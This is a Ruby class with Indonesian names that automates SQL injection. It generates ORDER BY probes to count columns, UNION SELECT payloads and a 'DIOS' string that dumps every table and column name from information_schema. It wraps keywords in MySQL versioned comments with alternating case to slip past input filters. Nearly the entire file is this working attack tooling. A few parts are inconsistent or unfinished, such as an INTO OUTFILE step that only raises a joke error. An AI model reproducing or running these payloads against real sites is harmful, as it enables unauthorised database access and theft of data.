class PembuatQuery
	AWAL_QUERY = %q(').freeze
	ORDER_BY = %q(order+by+).freeze
	UNION_SELECT = %q(union+select+).freeze
	PEMBATAS_PERINTAH = %q(;).freeze
	AKHIR_QUERY = %q(;--+-).freeze
	PARAMETER_GET = %w( - . )
	DIOS = "make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)"

	LIST_KONDISI = [
		:bypass_orderby, 
		:mencari_kolom, 
		:union_konten, 
		:into_outfile_test, 
		:dios
	]

	attr_accessor :param, :kolom, :union_konten, :into_outfile_test, :dios, :kondisi, :data

	def initialize
		@param = nil
		@data = nil
		@kolom = nil
		@union_konten = []
		@into_outfile = false
		@dios = nil
		@kondisi = :bypass_orderby
	end

	def melangkah
		@data = nil
		@kondisi = LIST_KONDISI[LIST_KONDISI.index(@kondisi) + 1]
		self
	end

	def query
		String.new.concat(bentuk_param, AWAL_QUERY, buat_query, AKHIR_QUERY)
	end

	def bentuk_param
		LIST_KONDISI.index(@kondisi) > 1 ? PARAMETER_GET.first.clone.concat(@param.to_s) : @param.to_s
	end

	def buat_query
		case @kondisi
		when :bypass_orderby
			puts "Order By Bypass".concat(@data.is_a?(String) ? 'TInggi' : 'Rendah', "=" * 30)
			q = buat_bentuk_orderby
			@data = String.new
			return q
		when :mencari_kolom
			if @kolom.nil?
				@kolom = 0
				@data = { fokus: 10, naik: true }
				puts "Pencarian KoLoM =============================="
			end
			@kolom += data[:naik] ? 1 : -1 
			q = buat_orderby
			orderby_santai if @kolom.zero?
			return q
		when :union_konten
			puts "UNION SELECT ================================"
			buat_union(1..kolom)
		when :into_outfile_test
			raise "GAK ADA UDAH MALEM!"
		when :dios
			buat_dios
		end
	end

	def gaya_komen_5_angka(q)
		kapital = (rand > 0.5)
		bypass = "/*!12345%s*/"
		q.gsub(/\w+\+/) do |i|
			i.size.times do |t|
				i[t] = i[t].upcase if kapital
				kapital = !kapital
			end
			i.chop!
			"/*!12345%s*/+" % i
		end
	end

	def orderby_santai
		@data = { fokus: 1, naik: true }
		@kolom = 1
	end

	def buat_bentuk_orderby
		gaya_komen_5_angka(ORDER_BY.dup).concat(data.is_a?(String) ? '999' : '1')
	end

	def buat_orderby
		perkiraan = kolom * data[:fokus]
		puts ("OrderBy %03d --------mengirim" % [perkiraan])
		gaya_komen_5_angka(ORDER_BY.dup).concat("%d") % [perkiraan]
	end

	def kolom_tertinggal
		if data[:fokus] == 1
			@kolom += data[:naik] ? -1 : 1
			raise "Kolom Ditemukan" 
		end

		# Level fokus : 10, 5, 1
		tmp = data[:fokus]
		@data[:fokus] = case data[:fokus]
		when 5 ; 1	
		when 10 ; 5
		end
		@kolom = @kolom * tmp / data[:fokus]
		@data[:naik] = !data[:naik]
	end

	def buat_union(range)
		r = range.to_a.collect { |i| "#{i}#{i + 1}#{i + 2}" }
		gaya_komen_5_angka(UNION_SELECT.dup).concat(r.join(','))
	end

	def buat_dios
		union = buat_union(1..kolom)
		range1 = data..kolom
		range2 = (data + 1)..kolom
		r1 = range1.to_a.collect { |i| "#{i}#{i + 1}#{i + 2}" }.join(',')
		r2 = range2.to_a.collect { |i| "#{i}#{i + 1}#{i + 2}" }.join(',')
		union.sub(/#{r1}$/) { DIOS + ',' + r2 }
	end
end

# require 'clipboard'
# Clipboard.copy PembuatQuery.new.query